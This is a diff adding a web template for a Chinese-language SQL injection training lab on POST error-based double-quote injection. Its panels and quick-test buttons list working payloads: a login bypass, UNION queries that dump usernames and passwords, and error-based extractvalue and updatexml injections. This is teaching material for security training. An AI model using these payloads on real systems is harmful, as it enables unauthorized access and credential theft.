@@ -1,0 +1,193 @@
+{% extends "base.html" %}
+
+{% block title %}Less-12: POST - Error Based - Double Quotes{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-lg-8">
+            <div class="card lab-card">
+                <div class="card-header">
+                    <h2><i class="fas fa-paper-plane"></i> Less-12: POST - 错误注入 - 双引号</h2>
+                    <span class="badge badge-primary">POST注入</span>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <strong>学习目标：</strong> 理解POST方法中的双引号SQL注入，掌握表单注入的测试技巧
+                    </div>
+
+                    <div class="login-form-section">
+                        <h5>用户登录</h5>
+                        <form method="POST" class="mb-4">
+                            <div class="form-group">
+                                <label for="uname">用户名：</label>
+                                <input type="text" class="form-control" name="uname" id="uname" 
+                                       value="{{ uname }}" placeholder="输入用户名">
+                            </div>
+                            <div class="form-group">
+                                <label for="passwd">密码：</label>
+                                <input type="password" class="form-control" name="passwd" id="passwd" 
+                                       value="{{ passwd }}" placeholder="输入密码">
+                            </div>
+                            <button type="submit" class="btn btn-primary">
+                                <i class="fas fa-sign-in-alt"></i> 登录
+                            </button>
+                        </form>
+                    </div>
+
+                    {% if uname or passwd %}
+                    <div class="result-section">
+                        <h5>测试结果：</h5>
+                        {% if error_msg %}
+                        <div class="alert alert-danger">
+                            <strong>错误信息：</strong><br>
+                            <code>{{ error_msg }}</code>
+                        </div>
+                        {% endif %}
+                        
+                        {% if result %}
+                        <div class="alert alert-success">
+                            <strong>查询结果：</strong><br>
+                            {% for row in result %}
+                            <div class="user-info">
+                                <strong>ID:</strong> {{ row[0] }}<br>
+                                <strong>用户名:</strong> {{ row[1] }}<br>
+                                <strong>密码:</strong> {{ row[2] }}<br>
+                                <strong>邮箱:</strong> {{ row[3] }}<br>
+                                <strong>机密数据:</strong> {{ row[4] }}
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% endif %}
+                        
+                        {% if message %}
+                        <div class="alert alert-warning">
+                            {{ message }}
+                        </div>
+                        {% endif %}
+                    </div>
+                    {% endif %}
+
+                    <div class="quick-tests mt-4">
+                        <h5>快速测试载荷：</h5>
+                        <div class="payload-buttons">
+                            <button class="btn btn-outline-primary btn-sm" onclick="setPayload('admin', 'admin123')">
+                                正常登录: admin/admin123
+                            </button>
+                            <button class="btn btn-outline-warning btn-sm" onclick="setPayload('admin\"', 'password')">
+                                语法错误: admin"
+                            </button>
+                            <button class="btn btn-outline-success btn-sm" onclick="setPayload('admin\" or \"1\"=\"1', 'anything')">
+                                绕过登录: admin" or "1"="1
+                            </button>
+                            <button class="btn btn-outline-info btn-sm" onclick="setPayload('admin\" union select 1,2,3,4,5--+', 'anything')">
+                                联合查询: admin" union select 1,2,3,4,5--+
+                            </button>
+                            <button class="btn btn-outline-danger btn-sm" onclick="setPayload('admin\" and extractvalue(1,concat(0x7e,database(),0x7e))--+', 'anything')">
+                                报错注入: extractvalue函数
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-4">
+            <div class="card info-card">
+                <div class="card-header">
+                    <h5><i class="fas fa-lightbulb"></i> 漏洞分析</h5>
+                </div>
+                <div class="card-body">
+                    <h6>漏洞类型：</h6>
+                    <p>POST双引号字符串注入</p>
+                    
+                    <h6>特点：</h6>
+                    <ul>
+                        <li>POST方法提交</li>
+                        <li>双引号闭合</li>
+                        <li>表单参数注入</li>
+                        <li>错误信息显示</li>
+                    </ul>
+
+                    <h6>SQL查询结构：</h6>
+                    <code>SELECT * FROM users WHERE username="用户输入" AND password="用户输入"</code>
+                </div>
+            </div>
+
+            <div class="card payload-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-code"></i> POST载荷示例</h5>
+                </div>
+                <div class="card-body">
+                    <h6>绕过登录：</h6>
+                    <code>admin" or "1"="1</code><br>
+                    <code>admin" or "1"="1"--+</code><br><br>
+                    
+                    <h6>联合查询：</h6>
+                    <code>admin" union select 1,2,3,4,5--+</code><br>
+                    <code>" union select 1,username,password,4,5 from users--+</code><br><br>
+                    
+                    <h6>报错注入：</h6>
+                    <code>admin" and extractvalue(1,concat(0x7e,database(),0x7e))--+</code><br>
+                    <code>admin" and updatexml(1,concat(0x7e,version(),0x7e),1)--+</code>
+                </div>
+            </div>
+
+            <div class="card method-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-exchange-alt"></i> GET vs POST</h5>
+                </div>
+                <div class="card-body">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th>方面</th>
+                                <th>GET</th>
+                                <th>POST</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>参数位置</td>
+                                <td>URL中</td>
+                                <td>请求体中</td>
+                            </tr>
+                            <tr>
+                                <td>可见性</td>
+                                <td>明文可见</td>
+                                <td>相对隐蔽</td>
+                            </tr>
+                            <tr>
+                                <td>测试工具</td>
+                                <td>浏览器直接</td>
+                                <td>需要工具</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card tips-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-tools"></i> 测试工具</h5>
+                </div>
+                <div class="card-body">
+                    <ul>
+                        <li><strong>Burp Suite:</strong> 拦截修改POST请求</li>
+                        <li><strong>OWASP ZAP:</strong> 自动化扫描</li>
+                        <li><strong>SQLMap:</strong> 自动化注入</li>
+                        <li><strong>浏览器开发者工具:</strong> 修改表单</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function setPayload(username, password) {
+    document.getElementById('uname').value = username;
+    document.getElementById('passwd').value = password;
+}
+</script>
+{% endblock %} 
